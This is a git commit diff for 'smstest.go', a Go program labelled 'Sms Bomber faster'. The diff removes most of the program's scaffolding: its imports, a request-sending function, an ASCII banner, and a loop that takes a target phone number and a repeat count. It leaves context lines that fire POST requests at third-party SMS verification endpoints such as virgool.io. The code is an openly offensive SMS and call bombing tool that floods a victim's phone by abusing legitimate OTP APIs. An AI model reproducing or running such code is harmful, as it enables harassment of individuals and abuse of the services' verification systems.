b2b942655a28f3b354283e613606260a2465713d
monsmain <matinfarmani20@gmail.com>
2025-04-27 12:28:12 +0330

    Update smstest.go

--- smstest.go
+++ smstest.go
@@ -15,123 +15,9 @@
 //⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
 //⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
 //⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
-//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
-//⚠️⚠️in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
-//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
-//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
-//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
-//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
-//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
 
-package main
 
-import (
-	"bytes"
-	"encoding/json"
-	"fmt"
-	"net/http"
-	"os"
-	"os/exec"
-	"runtime"
-	"time"
-)
 
-/* import: 	net/url  strings
-===============================================
-Link Github : https://github.com/monsmain    
-===============================================
-Sms Bomber faster
-*/
-func clearScreen() {
-	cmd := exec.Command("clear")
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "cls")
-	}
-	cmd.Stdout = os.Stdout
-	cmd.Run()
-}
-func sms(url string, headers map[string]interface{}, ch chan<- int) {
-	jsonData, err := json.Marshal(headers)
-	if err != nil {
-		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
-		ch <- http.StatusInternalServerError
-		return
-	}
-
-	time.Sleep(3 * time.Second)
-
-	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
-	time.Sleep(3 * time.Second)
-
-	if err != nil {
-		fmt.Println("\033[01;31m[-] Error while sending request!\033[0m")
-		ch <- http.StatusInternalServerError
-		return
-	}
-	defer resp.Body.Close()
-
-	ch <- resp.StatusCode
-}
-
-func main() {
-	clearScreen()
-
-	fmt.Print("\033[01;32m") // Top (green)
-	fmt.Print(`
-                                :-.                                   
-                         .:   =#-:-----:                              
-                           **%@#%@@@#*+==:                            
-                       :=*%@@@@@@@@@@@@@@%#*=:                        
-                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
-                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
-              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
-             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
-            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
-            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
-           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
-`)
-	fmt.Print("\033[01;37m") // Middle (white)
-	fmt.Print(`
-           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
-           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
-           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
-           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
-            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
-            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
-            *@@%#             -@@@@@@.            #@@@+             
-             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
-             :@@*            =%@@@@@@%-  faster    *@@:              
-              #@@%         .*@@@@#%@@@%+.         %@@+              
-              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
-`)
-	fmt.Print("\033[01;31m") // Bottom (red)
-	fmt.Print(`
-              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
-               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
-                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
-                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
-                      #@@@@@@@@@@@@@@@@@@@@@@+                      
-                       *@@@@@@@@@@@@@@@@@@@@+                       
-                        +@@%*@@%@@@%%@%*@@%=                         
-                         +%+ %%.+@%:-@* *%-                          
-                          .  %# .%#  %+                              
-                             :.  %+  :.                              
-                                 -:                                  
-`)
-	fmt.Print("\033[0m") // Reset color
-
-	var phone string
-	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m200 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
-	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
-	fmt.Scan(&phone)
-
-	var repeatCount int
-	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
-	fmt.Scan(&repeatCount)
-
-	ch := make(chan int)
-
-	for i := 0; i < repeatCount; i++ {
 /////////////////////////////////////// site aparat should definitely be added.
 		
                 go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
@@ -506,15 +392,3 @@ func main() {
 			"mobile": "phone",
 		}, ch)  // edit :4/22/2025
 
-	}
-
-	for i := 0; i < repeatCount*207; i++ {
-		statusCode := <-ch
-		if statusCode == 404 || statusCode == 400 {
-			fmt.Println("\033[01;31m[-] Error ! ")
-		} else {
-			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
-		}
-
-	}
-}
